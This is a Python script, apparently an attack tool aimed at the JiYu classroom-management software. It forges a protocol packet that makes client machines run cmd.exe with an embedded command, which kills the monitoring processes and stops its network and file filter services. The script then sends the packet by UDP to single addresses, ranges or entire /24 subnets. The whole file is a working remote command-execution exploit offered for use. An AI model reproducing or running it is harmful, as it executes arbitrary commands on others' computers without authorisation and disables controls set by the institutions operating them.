import sys
import socket
import argparse
from struct import pack

HARDCODED_CMD = "taskkill -f -im GATESRV.exe -im MasterHelper.exe -im studentmain.exe&sc stop TDNetFilter&sc stop TDFileFilter"

# 极域命令执行数据包基础结构 (DMO协议)
base_cmd_packet = [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00] + [0x00] * 478

def format_cmd(content):
    """UTF-16LE编码（小端序）"""
    arr = []
    for ch in content:
        code = ord(ch)
        arr.append(code & 0xFF)           # 低字节在前
        arr.append((code >> 8) & 0xFF)    # 高字节在后
    arr.extend([0, 0])  # Unicode字符串结束符
    return arr

def build_packet(cmd):
    result = base_cmd_packet.copy()
    formatted = format_cmd(cmd)
    
    # 命令注入位置：578字节偏移（紧跟cmd.exe路径之后）
    CMD_OFFSET = 578
    max_len = len(result) - CMD_OFFSET
    
    if len(formatted) > max_len:
        print(f"[-] 命令过长：{len(formatted)} > {max_len}")
        sys.exit(1)
    
    for i, b in enumerate(formatted):
        result[CMD_OFFSET + i] = b
    
    return result

def parse_ip(ip):
    targets = []
    if '.' not in ip:
        print('[-] IP格式错误')
        sys.exit(1)
    
    if '-' in ip:
        start, end = ip.split('-')
        base = start.rsplit('.', 1)[0]
        s, e = int(start.rsplit('.', 1)[1]), int(end)
        for i in range(s, min(e + 1, 255)):
            targets.append(f"{base}.{i}")
    elif '/24' in ip:
        base = ip.rsplit('.', 1)[0].replace('/24', '')
        for i in range(1, 255):
            targets.append(f"{base}.{i}")
    else:
        targets.append(ip)
    
    return targets

def attack(targets, port):
    packet = build_packet(HARDCODED_CMD)
    payload = pack("%dB" % len(packet), *packet)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    for ip in targets:
        try:
            sock.sendto(payload, (ip, port))
            print(f"[+] 已发送 -> {ip}:{port}")
        except Exception as e:
            print(f"[-] 发送失败 {ip}: {e}")
    
    sock.close()
    print("[+] 执行完毕")

def main():
    parser = argparse.ArgumentParser(description="极域进程终止工具")
    parser.add_argument('-ip', required=True, help="目标IP（单IP/范围如10-50/C段如/24）")
    parser.add_argument('-p', type=int, default=4705, help="端口（默认4705）")
    args = parser.parse_args()
    
    targets = parse_ip(args.ip)
    print(f"[*] 命令: {HARDCODED_CMD}")
    print(f"[*] 目标数: {len(targets)}")
    
    attack(targets, args.p)

if __name__ == '__main__':
    main()
